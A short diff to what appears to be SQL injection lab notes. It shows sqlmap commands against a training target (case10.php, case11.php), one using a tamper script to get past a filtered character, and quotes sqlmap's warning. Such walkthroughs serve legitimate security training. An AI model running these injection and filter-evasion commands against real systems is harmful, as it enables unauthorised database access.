@@ -67,7 +67,9 @@ sqlmap -u "http://94.237.52.98:38740/case10.php" --data='id=1' --batch --threads
 ```bash
 sqlmap -u "http://94.237.52.98:38740/case11.php?id=1" -p id --batch --dbms=mysql --dbs --tamper=between
 ```
+
 ```txt
 [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to reru  
 n with the '--tamper=between'
 ```
+
